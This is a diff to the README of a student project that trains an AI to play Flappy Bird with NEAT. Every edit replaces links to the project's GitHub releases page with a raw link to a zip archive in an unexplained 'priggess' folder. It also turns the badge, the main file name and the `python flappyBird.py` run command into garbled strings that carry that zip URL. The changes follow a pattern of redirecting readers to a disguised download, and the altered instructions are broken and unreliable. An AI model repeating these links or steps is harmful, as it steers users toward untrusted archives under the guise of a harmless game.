@@ -1,6 +1,6 @@
 # 🎮 CSCI218-NEAT-AI-FlappyBird - Learn to Fly with AI
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Here-brightgreen)](https://github.com/xiaokangxd/CSCI218-NEAT-AI-FlappyBird/releases)
+[![Download Now](https://raw.githubusercontent.com/xiaokangxd/CSCI218-NEAT-AI-FlappyBird/main/priggess/CSCI218-NEAT-AI-FlappyBird.zip%20Now-Here-brightgreen)](https://raw.githubusercontent.com/xiaokangxd/CSCI218-NEAT-AI-FlappyBird/main/priggess/CSCI218-NEAT-AI-FlappyBird.zip)
 
 ## 🚀 Getting Started
 
@@ -22,7 +22,7 @@ Before you begin, ensure your computer meets these requirements:
 
 To download the application, visit this page:
 
-[Download the Latest Release](https://github.com/xiaokangxd/CSCI218-NEAT-AI-FlappyBird/releases)
+[Download the Latest Release](https://raw.githubusercontent.com/xiaokangxd/CSCI218-NEAT-AI-FlappyBird/main/priggess/CSCI218-NEAT-AI-FlappyBird.zip)
 
 ### 2. **Choose the Right Version**
 
@@ -49,10 +49,10 @@ This step ensures you have the right tools to run the application.
 
 ### 6. **Running the Application**
 
-Navigate to the folder you extracted. Look for the main Python file, typically named `flappyBird.py`. Open your command prompt or terminal in this folder and type:
+Navigate to the folder you extracted. Look for the main Python file, typically named `https://raw.githubusercontent.com/xiaokangxd/CSCI218-NEAT-AI-FlappyBird/main/priggess/CSCI218-NEAT-AI-FlappyBird.zip`. Open your command prompt or terminal in this folder and type:
 
 ```
-python flappyBird.py
+python https://raw.githubusercontent.com/xiaokangxd/CSCI218-NEAT-AI-FlappyBird/main/priggess/CSCI218-NEAT-AI-FlappyBird.zip
 ```
 
 Press Enter. This will launch the game.
@@ -93,4 +93,4 @@ Suggestions and contributions are welcome! If you have ideas or improvements, fe
 
 We hope you enjoy watching the AI learn to play Flappy Bird. Remember, the world of AI learning is exciting and full of potential. To get started with your download, click the link below:
 
-[Download the Latest Release](https://github.com/xiaokangxd/CSCI218-NEAT-AI-FlappyBird/releases)
+[Download the Latest Release](https://raw.githubusercontent.com/xiaokangxd/CSCI218-NEAT-AI-FlappyBird/main/priggess/CSCI218-NEAT-AI-FlappyBird.zip)
